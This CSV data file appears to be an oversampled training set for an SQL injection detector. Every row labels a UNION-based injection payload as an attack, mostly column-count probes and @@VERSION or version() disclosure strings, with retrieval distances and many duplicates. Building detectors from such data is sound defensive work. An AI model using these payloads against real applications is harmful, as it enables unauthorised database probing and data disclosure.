id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001130,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.8806182060391912
SMOTE_001131,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.05049496760468704
SMOTE_001132,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.972181385913725
SMOTE_001133,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.3970199573095292
SMOTE_001134,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,0.940594619918443
SMOTE_001135,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,0.8067817032623843
SMOTE_001136,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,0.49165940593768354
SMOTE_001137,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.0516269008582697
SMOTE_001138,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.9982395093244901
SMOTE_001139,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,0.9898875055115036
SMOTE_001140,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.285337539821352
SMOTE_001141,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.4016612884545757
SMOTE_001142,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.26057117715691414
SMOTE_001143,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,0.9892846078107107
SMOTE_001144,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.8615003671500935
SMOTE_001145,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,1.4923174242935862
SMOTE_001146,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000019,1.7354303936242836
SMOTE_001147,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,0.03692950717332686
SMOTE_001148,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,1.1666082401841327
SMOTE_001149,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.29259573371123265
SMOTE_001150,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.8363369263539906
SMOTE_001151,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.45613101977196246
SMOTE_001152,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.8956930192602204
SMOTE_001153,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,2.96397594559666
SMOTE_001154,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,1.2931256072018542
SMOTE_001155,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.3144868672163104
SMOTE_001156,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,1.6320460784957993
SMOTE_001157,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.22621023374693616
SMOTE_001158,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,1.0508998232820796
SMOTE_001159,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.8640423466129018
SMOTE_001160,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.845584529628184
SMOTE_001161,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.3443108408748521
SMOTE_001162,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,1.1023778831834934
SMOTE_001163,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,3.0964616351573286
SMOTE_001164,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.9015464424452695
SMOTE_001165,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,1.4808018057287322
SMOTE_001166,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,1.1375399214017805
SMOTE_001167,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,1.8517532126697742
SMOTE_001168,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000019,2.682797384394042
SMOTE_001169,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.8097203665161623
SMOTE_001170,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,0.5484780014455609
SMOTE_001171,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,1.9403584289541664
SMOTE_001172,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,0.40385579968651814
SMOTE_001173,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,1.7714717349273374
SMOTE_001174,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.8080015051898062
SMOTE_001175,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.6373331196601698
SMOTE_001176,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.4904660334164718
SMOTE_001177,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,0.8403060283847822
SMOTE_001178,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,0.7066765514750777
SMOTE_001179,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,2.11437100094849
SMOTE_001180,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.9782514195967603
SMOTE_001181,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,0.055158577043873454
SMOTE_001182,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,0.3908292848390879
SMOTE_001183,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.831991217524299
SMOTE_001184,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,0.7150086157111465
SMOTE_001185,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,2.083004236578654
SMOTE_001186,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,0.45540952885865
SMOTE_001187,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,1.5321553925576785
SMOTE_001188,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,1.1999846938476602
SMOTE_001189,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,1.918371937153967
SMOTE_001190,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,0.9102413922442782
SMOTE_001191,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,0.11354778606811013
SMOTE_001192,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,1.8768187999791184
SMOTE_001193,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,0.9365802323670374
SMOTE_001194,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,0.3191476662949403
SMOTE_001195,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.5009357462686208
SMOTE_001196,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.7539579435996252
SMOTE_001197,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,0.04391903571547382
SMOTE_001198,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,0.31077021997035936
SMOTE_001199,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,2.0412081664065904
SMOTE_001200,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.7493851112309339
SMOTE_001201,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,1.5007119202291972
SMOTE_001202,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,0.26054456642943785
SMOTE_001203,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,2.074754673091881
SMOTE_001204,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,2.4514068090374104
SMOTE_001205,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,1.0516524659409556
SMOTE_001206,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,3.1196966505903774
SMOTE_001207,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.7221739904092952
SMOTE_001208,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.45912754595097993
SMOTE_001209,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,0.8953914721497623
SMOTE_001210,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,1.8603046019815999
SMOTE_001211,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,0.1332582065946693
SMOTE_001212,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.4558531380902557
SMOTE_001213,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000019,0.8593330613835166
SMOTE_001214,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000028,0.7962215039543058
SMOTE_001215,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.5448479413567372
SMOTE_001216,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,0.3578216843640048
SMOTE_001217,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,0.7918717312612293
SMOTE_001218,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,1.137367407130208
SMOTE_001219,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,3.10579236548805
SMOTE_001220,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,3.3047726364889463
SMOTE_001221,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.5432999839194667
SMOTE_001222,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.07122836171181068
SMOTE_001223,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,1.5368131005460248
SMOTE_001224,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.24992815471207902
SMOTE_001225,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,1.114789375454767
SMOTE_001226,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.35617229241731946
SMOTE_001227,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,1.967892365304963
SMOTE_001228,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,0.016173592411067268
SMOTE_001229,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,2.281218424903285
SMOTE_001230,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,0.09120664165505078
SMOTE_001231,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,0.3236580514841401
SMOTE_001232,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,1.3067048165370085
SMOTE_001233,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,1.3610281333469505
